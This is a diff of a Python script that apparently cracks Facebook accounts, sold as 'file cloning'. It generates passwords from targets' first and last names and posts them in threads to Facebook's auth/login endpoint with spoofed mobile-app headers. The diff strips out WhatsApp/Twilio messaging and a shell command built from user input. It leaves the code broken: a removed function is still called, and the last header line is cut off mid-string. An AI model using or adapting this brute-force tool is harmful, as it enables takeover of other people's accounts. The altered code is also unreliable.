@@ -4,11 +4,8 @@ import random
 import string
 import requests
 import sys
-import subprocess
-import urllib.parse
 from concurrent.futures import ThreadPoolExecutor as tpe
 import uuid
-from twilio.rest import Client
 
 idss = []
 pp = []
@@ -37,40 +34,6 @@ logo = ("""
     VMMMP"    dMP dMP    VMMMP"     dMP dMP    
 """)
 
-# Crée un client Twilio
-client = Client()
-
-def generate_approval_key():
-    # Génère une clé d'approbation aléatoire
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=30))
-
-def send_whatsapp_message(message):
-    # Envoie un message WhatsApp
-    try:
-        message = client.messages.create(
-            body=message,
-            from_='whatsapp:',  # Ajouter ici votre numéro Twilio
-            to='whatsapp:'  # Ajouter ici votre numéro WhatsApp
-        )
-        print("Message sent successfully!")
-    except Exception as e:
-        print("An error occurred while sending the message:", e)
-
-def send_custom_whatsapp_message(phone_number, message):
-    # Envoie un message WhatsApp personnalisé
-    try:
-        # Encodage du message pour l'URI WhatsApp
-        message_encoded = urllib.parse.quote(message)
-        # Construction de l'URI personnalisé pour WhatsApp avec le numéro de téléphone et le message
-        uri_whatsapp = f"whatsapp://send?phone={phone_number}&text={message_encoded}"
-        # Commande pour lancer WhatsApp avec l'URI personnalisé
-        command = f"am start -a android.intent.action.VIEW -d '{uri_whatsapp}'"
-        # Exécuter la commande
-        subprocess.run(command, shell=True)
-        print("Custom WhatsApp message sent successfully!")
-    except Exception as e:
-        print("An error occurred while sending the custom WhatsApp message:", e)
-
 def clear():
     os.system('clear')
     print(logo)
@@ -96,42 +59,23 @@ def main_menu():
     os.system("clear")
     print(logo)
     lin3()
-    if approval_key:
-        print(f"{oo(1)}File Cloning ")
-        print(f"{oo(2)}Send Key") 
-        print(f"{oo(3)}Send WhatsApp Message") 
-        print(f"{oo(0)}Exit")
-    else:
-        print(f"{oo(0)}Waiting for approval key...")
+    print(f"{oo(1)}File Cloning ")   
+    print(f"{oo(0)}Exit")
     lin3()
-    if approval_key:
-        cp = input('[?] Choice : ')
-        if cp == "1":
-            key_approval = generate_approval_key()
-            print("Approval Key:", key_approval)  # Affiche la clé d'approbation
-            send_whatsapp_message(f'Approval Key: {key_approval}')  # Envoyer la clé d'approbation à votre numéro WhatsApp
-            key_approval_input = input('Enter the approval key: ')  # Attend que l'utilisateur entre la clé d'approbation
-            if check_approval_key(key_approval_input):
-                file()
-            else:
-                print('Invalid approval key. Exiting...')
-                time.sleep(1)
-                main_menu()
-        if cp == "0":
-            exit()
-        if cp == "2":
-            key_approval = generate_approval_key()
-            print("Approval Key:", key_approval)  # Affiche la clé d'approbation
-            send_whatsapp_message(f'Approval Key: {key_approval}')  # Envoyer la clé d'approbation à votre numéro WhatsApp
+    cp = input('[?] Choice : ')
+    if cp == "1":
+        key_approval = generate_approval_key()
+        print("Approval Key:", key_approval)  # Affiche la clé d'approbation
+        key_approval_input = input('Enter the approval key: ')  # Attend que l'utilisateur entre la clé d'approbation
+        if check_approval_key(key_approval_input):
+            file()
+        else:
+            print('Invalid approval key. Exiting...')
+            time.sleep(1)
             main_menu()
-        if cp == "3":
-            phone_number = input("Enter the phone number: ")
-            message = input("Enter the message: ")
-            send_custom_whatsapp_message(phone_number, message)
-            main_menu()
-    else:
-        time.sleep(2)
-        main_menu()
+    if cp == "0":
+        exit()
+    main_menu()
      
 def file():
     os.system("clear")
@@ -186,7 +130,7 @@ def method():
             for pswd in pp:
                 heads=None
                 pswd = pswd.replace('first',first).replace('last',last).lower()
-                header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62"}
+                header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740"
                 response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                 if 6==random.randint(1,300):
                     oku.append(acc)
